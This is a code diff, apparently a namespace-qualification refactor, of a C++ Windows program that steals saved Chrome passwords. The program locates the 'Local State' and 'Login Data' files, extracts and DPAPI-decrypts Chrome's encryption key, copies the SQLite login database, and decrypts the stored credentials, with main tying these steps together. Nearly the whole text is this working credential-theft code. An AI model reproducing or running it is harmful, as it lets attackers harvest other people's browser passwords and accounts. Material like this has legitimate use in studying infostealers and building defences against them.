@@ -4,7 +4,7 @@
 //Check if WIndows system
 #ifdef _WIN32
 
-wstring FindLocalState() {
+std::wstring FindLocalState() {
   WCHAR userProfile[MAX_PATH];
   HRESULT result = SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile);
 
@@ -16,10 +16,10 @@ wstring FindLocalState() {
   WCHAR localStatePath[MAX_PATH];
   _snwprintf_s(localStatePath, MAX_PATH, _TRUNCATE, L"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", userProfile);
   okay("Full path to Local State file: %ls", localStatePath);
-  return wstring(localStatePath);
+  return std::wstring(localStatePath);
 }
 
-wstring FindLoginData() {
+std::wstring FindLoginData() {
   WCHAR userProfile[MAX_PATH];
   HRESULT result = SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile);
 
@@ -31,11 +31,11 @@ wstring FindLoginData() {
   WCHAR loginDataPath[MAX_PATH];
   _snwprintf_s(loginDataPath, MAX_PATH, L"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", userProfile);
   okay("Full path to Login Data file: %ls", loginDataPath);
-  return wstring(loginDataPath);
+  return std::wstring(loginDataPath);
 }
 
-string getEncryptedKey(const wstring& localStatePath) {
-  ifstream file(localStatePath);
+std::string getEncryptedKey(const std::wstring& localStatePath) {
+  std::ifstream file(localStatePath);
   if (!file.is_open()) {
     warn("Error opening the file. Error: %ld", GetLastError());
     return "";
@@ -57,13 +57,13 @@ string getEncryptedKey(const wstring& localStatePath) {
   }
 
   okay("Key encrypted_key found");
-  string encryptedKey = itEncryptedKey.value();
+  std::string encryptedKey = itEncryptedKey.value();
   okay("Value at key encrypted_key: %s", encryptedKey.c_str());
 
   return encryptedKey;
 }
 
-DATA_BLOB decryptKey(const string encrypted_key) {
+DATA_BLOB decryptKey(const std::string encrypted_key) {
   if (encrypted_key.empty()) {
     warn("Input string is empty.");
     return {};
@@ -80,7 +80,7 @@ DATA_BLOB decryptKey(const string encrypted_key) {
     return {};
   }
 
-  vector<BYTE> decodedBinaryData(decodedBinarySize);
+  std::vector<BYTE> decodedBinaryData(decodedBinarySize);
   if (!CryptStringToBinaryA(encrypted_key.c_str(), 0, CRYPT_STRING_BASE64, decodedBinaryData.data(), &decodedBinarySize, NULL, NULL)) {
     warn("Error decoding Base64 string second step. Error: %ld\n", GetLastError());
     return {};
@@ -108,11 +108,11 @@ DATA_BLOB decryptKey(const string encrypted_key) {
   return DataOutput;
 }
 
-int loginDataParser(const wstring& loginDataPath, DATA_BLOB decryptionKey) {
+int loginDataParser(const std::wstring& loginDataPath, DATA_BLOB decryptionKey) {
   sqlite3* loginDataBase = nullptr;
   int openingStatus = 0;
 
-  wstring copyLoginDataPath = loginDataPath;
+  std::wstring copyLoginDataPath = loginDataPath;
   copyLoginDataPath.append(L"a");
 
   if (!CopyFileW(loginDataPath.c_str(), copyLoginDataPath.c_str(), FALSE)) {
@@ -243,10 +243,10 @@ void passwordDecrypter(unsigned char* ciphertext, size_t ciphertext_len, unsigne
 
 int main() {
 #ifdef _WIN32
-  wstring localStatePath = FindLocalState();
-  wstring loginDataPath = FindLoginData();
+  std::wstring localStatePath = FindLocalState();
+  std::wstring loginDataPath = FindLoginData();
 
-  string encryptedKey = getEncryptedKey(localStatePath);
+  std::string encryptedKey = getEncryptedKey(localStatePath);
   DATA_BLOB decryptionKey = decryptKey(encryptedKey);
 
   int parser = loginDataParser(loginDataPath, decryptionKey);
@@ -255,7 +255,7 @@ int main() {
   system("pause");
   return EXIT_SUCCESS;
 #else
-  printf("This program only runs on Windows systems.\n");
+  warn("This program only runs on Windows systems.\n");
   return EXIT_FAILURE;
 #endif
 }
